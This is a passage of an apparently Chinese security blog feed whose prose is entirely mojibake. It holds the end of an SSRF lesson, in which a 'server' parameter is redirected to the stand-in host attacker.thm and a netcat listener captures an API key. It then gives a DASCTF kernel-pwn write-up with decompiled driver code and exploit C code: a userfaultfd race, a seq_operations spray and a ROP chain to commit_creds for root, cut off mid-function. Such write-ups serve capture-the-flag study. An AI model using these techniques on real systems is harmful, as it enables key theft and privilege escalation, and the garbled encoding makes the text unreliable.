åº”ç”¨ç¨‹åºéœ€è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡çš„å®ç°ã€‚</p><p>ä¾‹å¦‚ï¼Œè€ƒè™‘ä¸€ä¸ªä½¿ç”¨å¤–éƒ¨ API å‘å…¶å®¢æˆ·ç«¯å‘é€ SMS é€šçŸ¥çš„ Web åº”ç”¨ç¨‹åºã€‚å¯¹äºæ¯å°ç”µå­é‚®ä»¶ï¼Œç½‘ç«™éƒ½éœ€è¦å‘ SMS æä¾›å•†çš„æœåŠ¡å™¨å‘å‡º Web è¯·æ±‚ï¼Œä»¥å‘é€è¦å‘é€çš„æ¶ˆæ¯å†…å®¹ã€‚ç”±äº SMS æä¾›å•†æŒ‰æ¶ˆæ¯æ”¶è´¹ï¼Œå› æ­¤ä»–ä»¬è¦æ±‚æ‚¨ä¸ºæ‚¨å‘å…¶ API å‘å‡ºçš„æ¯ä¸ªè¯·æ±‚æ·»åŠ ä»–ä»¬é¢„å…ˆåˆ†é…ç»™æ‚¨çš„å¯†é’¥ã€‚ API å¯†é’¥å……å½“èº«ä»½éªŒè¯ä»¤ç‰Œï¼Œå¹¶å…è®¸æä¾›å•†çŸ¥é“å‘è°è®¡è´¹æ¯æ¡æ¶ˆæ¯ã€‚è¯¥åº”ç”¨ç¨‹åºå°†åƒè¿™æ ·å·¥ä½œï¼š<br><img src="/PenTest_FILE/a88de69b44ccdd2f6282a8f9d1b43d82_MD5.jpeg"></p><p>é€šè¿‡æŸ¥çœ‹ä¸Šå›¾ï¼Œå¾ˆå®¹æ˜“çœ‹å‡ºæ¼æ´æ‰€åœ¨ã€‚åº”ç”¨ç¨‹åºå‘ç”¨æˆ·å…¬å¼€Â <code>server</code>Â å‚æ•°ï¼Œè¯¥å‚æ•°å®šä¹‰ SMS æœåŠ¡æä¾›å•†çš„æœåŠ¡å™¨åç§°ã€‚å¦‚æœæ”»å‡»è€…æ„¿æ„ï¼Œä»–ä»¬å¯ä»¥ç®€å•åœ°æ›´æ”¹Â <code>server</code>Â çš„å€¼ä»¥æŒ‡å‘ä»–ä»¬æ§åˆ¶çš„è®¡ç®—æœºï¼Œå¹¶ä¸”æ‚¨çš„ Web åº”ç”¨ç¨‹åºä¼šå¾ˆä¹æ„å°† SMS è¯·æ±‚è½¬å‘ç»™æ”»å‡»è€…è€Œä¸æ˜¯ SMS æä¾›å•†ã€‚ä½œä¸ºè½¬å‘æ¶ˆæ¯çš„ä¸€éƒ¨åˆ†ï¼Œæ”»å‡»è€…å°†è·å– API å¯†é’¥ï¼Œä»è€Œå…è®¸ä»–ä»¬ä½¿ç”¨ SMS æœåŠ¡å‘é€æ¶ˆæ¯ï¼Œè´¹ç”¨ç”±æ‚¨æ‰¿æ‹…ã€‚ä¸ºæ­¤ï¼Œæ”»å‡»è€…åªéœ€å‘æ‚¨çš„ç½‘ç«™å‘å‡ºä»¥ä¸‹è¯·æ±‚ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å°†ä½¿æ˜“å—æ”»å‡»çš„ Web åº”ç”¨ç¨‹åºå‘å‡ºè¯·æ±‚ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">https://attacker.thm/api/send?msg=ABC <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨ Netcat æ•è·è¯·æ±‚çš„å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">user@attackbox$ <span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">80</span>Listening on <span class="token number">0.0</span>.0.0 <span class="token number">80</span>Connection received on <span class="token number">10.10</span>.1.236 <span class="token number">43830</span>GET /:8087/public-docs/123.pdf HTTP/1.1Host: <span class="token number">10.10</span>.10.11User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0Accept: */*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>è¿™æ˜¯ SSRF çš„ä¸€ä¸ªéå¸¸åŸºæœ¬çš„æ¡ˆä¾‹ã€‚å¦‚æœè¿™çœ‹èµ·æ¥æ²¡æœ‰é‚£ä¹ˆå¯æ€•ï¼Œé‚£ä¹ˆ SSRF å®é™…ä¸Šå¯ä»¥ç”¨æ¥åšæ›´å¤šçš„äº‹æƒ…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ ¹æ®æ¯ä¸ªåœºæ™¯çš„å…·ä½“æƒ…å†µï¼ŒSSRF å¯ç”¨äºï¼š</p><ul><li>æšä¸¾å†…éƒ¨ç½‘ç»œï¼ŒåŒ…æ‹¬ IP åœ°å€å’Œç«¯å£ã€‚</li><li>æ»¥ç”¨æœåŠ¡å™¨ä¹‹é—´çš„ä¿¡ä»»å…³ç³»å¹¶è·å–å¯¹å…¶ä»–å—é™æœåŠ¡çš„è®¿é—®æƒé™ã€‚</li><li>ä¸ä¸€äº›é HTTP æœåŠ¡äº¤äº’ä»¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)ã€‚</li></ul><h2 id="ç»ƒä¹ -10"><a href="#ç»ƒä¹ -10" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><ul><li><p>æ¢ç´¢ç½‘ç«™ã€‚å”¯ä¸€å…è®¸è®¿é—®ç®¡ç†åŒºåŸŸçš„ä¸»æœºæ˜¯ä»€ä¹ˆï¼Ÿç­”ï¼šadmin<br><img src="/PenTest_FILE/e236617dc4c5be801bd210ee5726d936_MD5.jpeg"></p></li><li><p>æ£€æŸ¥â€œä¸‹è½½ç®€å†â€æŒ‰é’®ã€‚æœåŠ¡å™¨å‚æ•°æŒ‡å‘å“ªé‡Œï¼Ÿç­”ï¼šsecure-file-storage.com<br><img src="/PenTest_FILE/c81a6a402e31ff37fc114f6679d1d880_MD5.jpeg"></p></li><li><p>ä½¿ç”¨ SSRFï¼Œä½¿åº”ç”¨ç¨‹åºå°†è¯·æ±‚å‘é€åˆ° AttackBoxï¼Œè€Œä¸æ˜¯å®‰å…¨æ–‡ä»¶å­˜å‚¨ã€‚æ‹¦æˆªçš„è¯·æ±‚ä¸­æ˜¯å¦æœ‰APIå¯†é’¥ï¼Ÿç­”ï¼šTHM{Hello_Im_just_an_API_key}</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2023å…­æœˆæŒ‘æˆ˜èµ› äºŒè¿›åˆ¶ä¸“åœº DASKERNEL</title>
      <link href="/2024/03/15/DASCTF2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E5%9C%BA%20DASKERNEL/"/>
      <url>/2024/03/15/DASCTF2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E5%9C%BA%20DASKERNEL/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ezkernel! have fun!</p></blockquote><p>è®°å¾—è¿™é“kernel pwnçš„wpç»™å½“æ—¶åˆšå­¦å †çš„æˆ‘å¸¦æ¥äº†ä¸å°çš„éœ‡æ’¼</p><h1 id="ä¸€ã€é€†å‘åˆ†æ"><a href="#ä¸€ã€é€†å‘åˆ†æ" class="headerlink" title="ä¸€ã€é€†å‘åˆ†æ"></a>ä¸€ã€é€†å‘åˆ†æ</h1><h2 id="boot-sh"><a href="#boot-sh" class="headerlink" title="boot.sh"></a>boot.sh</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>  <span class="token parameter variable">-m</span> 256M <span class="token punctuation">\</span>  <span class="token parameter variable">-kernel</span> ./bzImage <span class="token punctuation">\</span>  <span class="token parameter variable">-initrd</span> ./rootfs.cpio <span class="token punctuation">\</span>  <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr pti=on quiet"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token punctuation">\</span>  <span class="token parameter variable">-net</span> user <span class="token parameter variable">-net</span> nic <span class="token parameter variable">-device</span> e1000 <span class="token punctuation">\</span>  <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>  <span class="token parameter variable">-nographic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€äº†smepå’Œptiï¼Œæ³¨æ„æ²¡æœ‰kaslr</p><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev<span class="token function">mount</span> <span class="token parameter variable">-t</span> tmpfs tmpfs /tmp/sbin/mdev <span class="token parameter variable">-s</span><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmx<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/console<span class="token function">ifup</span> eth0 <span class="token operator">></span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict<span class="token function">chown</span> root:root flag<span class="token function">chmod</span> <span class="token number">400</span> flaginsmod /DASKERNEL.ko<span class="token function">chmod</span> <span class="token number">777</span> /proc/DASKERNEL<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token function">cat</span> /welcomesetsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token comment">#setsid cttyhack setuidgid 0 sh</span><span class="token function">umount</span> /proc<span class="token function">umount</span> /syspoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DASKERNEL-ko"><a href="#DASKERNEL-ko" class="headerlink" title="DASKERNEL.ko"></a>DASKERNEL.ko</h2><h3 id="init-module"><a href="#init-module" class="headerlink" title="init_module"></a>init_module</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">init_module</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  babyLinkedList_file_entry <span class="token operator">=</span> <span class="token punctuation">(</span>proc_dir_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">proc_create</span><span class="token punctuation">(</span><span class="token string">"DASKERNEL"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>babyLinkedList_file_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> babyLinkedList_file_entry <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">babyLinkedList_init_cold</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">4294967284LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶èŠ‚ç‚¹ DASKERNEL</p><h3 id="babyLinkedList-ioctl"><a href="#babyLinkedList-ioctl" class="headerlink" title="babyLinkedList_ioctl"></a>babyLinkedList_ioctl</h3><p>æœ‰æ•ˆçš„é€‰é¡¹å°±ä¸¤ä¸ª</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">babyLinkedList_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">uint64_t</span> <span class="token operator">*</span>req<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">uint64_t</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  LinkedList <span class="token operator">*</span>LinkedList<span class="token punctuation">;</span> <span class="token comment">// r12</span>  LinkedList <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">uint64_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">uint64_t</span> v8<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// r12</span>  LinkedList <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// r13</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cmd <span class="token operator">==</span> <span class="token number">0x7777</span> <span class="token punctuation">)</span>                  <span class="token comment">// getã€del</span>  <span class="token punctuation">&#123;</span>    v11 <span class="token operator">=</span> head<span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>head <span class="token punctuation">)</span>      <span class="token keyword">return</span> v9<span class="token punctuation">;</span>    head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>head <span class="token punctuation">)</span>      <span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v11<span class="token operator">-></span>data<span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>v11<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>cmd <span class="token operator">&lt;=</span> <span class="token number">0x7777</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cmd <span class="token operator">==</span> <span class="token number">0x6666</span> <span class="token punctuation">)</span>              <span class="token comment">// setã€add</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>req <span class="token operator">></span> <span class="token number">0x40</span> <span class="token punctuation">)</span>                      <span class="token comment">// ä¼ å…¥çš„req->sizeä¸èƒ½å¤§äº0x40</span>          <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>        LinkedList <span class="token operator">=</span> <span class="token punctuation">(</span>LinkedList <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3264LL</span><span class="token punctuation">,</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        LinkedList<span class="token operator">-></span>size <span class="token operator">=</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span>                 <span class="token comment">// LinkedList->size = req->size</span>        v5 <span class="token operator">=</span> head<span class="token punctuation">;</span>        head <span class="token operator">=</span> LinkedList<span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span>        LinkedList<span class="token operator">-></span>next <span class="token operator">=</span> v5<span class="token punctuation">;</span>                  <span class="token comment">// LinkedList->next = head</span>        v7 <span class="token operator">=</span> <span class="token function">_kmalloc</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">3264LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// LinkedList->data = kmalloc(req->size, 3264)</span>        v8 <span class="token operator">=</span> v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        LinkedList<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v7<span class="token punctuation">;</span>        <span class="token function">copy_from_user</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// copy_from_usr(LinkedList->data, req->data, 8)</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cmd <span class="token operator">==</span> <span class="token number">0x8888</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"\x011[DASCTF:] Sorry i don't want to complete the function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> v9<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>cmd <span class="token operator">!=</span> <span class="token number">0x9999</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">babyLinkedList_ioctl_cold</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="äºŒã€åˆ©ç”¨æ€è·¯"><a href="#äºŒã€åˆ©ç”¨æ€è·¯" class="headerlink" title="äºŒã€åˆ©ç”¨æ€è·¯"></a>äºŒã€åˆ©ç”¨æ€è·¯</h1><p><img src="/EXP_FILE/d4476d7ee634d0c1ad8d11c90bdafca1_MD5.jpeg"></p><p>é€šè¿‡åˆ†æï¼Œç»´æŠ¤çš„ç»“æ„ä½“ä¸ºï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">linkedlist</span><span class="token punctuation">&#123;</span><span class="token class-name">uint64_t</span> size<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">linkedlist</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>LinkedList<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„ç»“æ„ä½“ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token class-name">uint64_t</span> size<span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨åˆ é™¤çš„æ—¶å€™æ²¡æœ‰ä»»ä½•é”ï¼Œæ€è€ƒæ¡ä»¶ç«äº‰ï¼Œ&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;unprivileged_userfaultfd&#x3D;1ï¼Œå…è®¸uaserfaultfdç³»ç»Ÿè°ƒç”¨</p><p>ä½¿ç”¨userfaultfdæŠŠç¨‹åºå¡åœ¨copy_from_userï¼Œå†é‡Šæ”¾é“¾è¡¨èŠ‚ç‚¹ï¼Œç”±äºåªèƒ½å†™é¦–8å­—èŠ‚ï¼Œæˆ‘é€‰æ‹©å–·å°„seq_operationsç»“æ„ä½“æ”¹startæŒ‡é’ˆï¼Œå†æ»‘åˆ°pt_regsçš„ropchainä¸Šã€‚</p><h1 id="ä¸‰ã€EXP"><a href="#ä¸‰ã€EXP" class="headerlink" title="ä¸‰ã€EXP"></a>ä¸‰ã€EXP</h1><p>ç»è¿‡è°ƒè¯•ï¼Œè·ç¦»pt_regsä¸º0x130å­—èŠ‚ï¼Œæˆ‘é€‰æ‹©äº†ä¸‹é¢çš„gagdetï¼š</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0xffffffff8188fba1: add rsp, 0x130; pop rbx; pop r12; pop rbp; ret;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸”ç”±äºgadgetçš„é™åˆ¶ï¼Œæˆ‘ä»¬åªèƒ½æ‰¾åˆ°é€‚åˆcommit_cred(&amp;init_cred)çš„ropé“¾ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/userfaultfd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0x6666</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0x7777</span></span></span><span class="token class-name">size_t</span> POP_RDI_RET <span class="token operator">=</span> <span class="token number">0xffffffff81086aa0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> POP_RDX_RET <span class="token operator">=</span> <span class="token number">0xffffffff8153d116</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ADD_RSP_0x130_PPP_RET <span class="token operator">=</span> <span class="token number">0xffffffff8188fba1</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0xffffffff810c40b0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff810c3d30</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode <span class="token operator">=</span> <span class="token number">0xffffffff81c00a34</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> init_cred <span class="token operator">=</span> <span class="token number">0xffffffff82a5fa40</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span 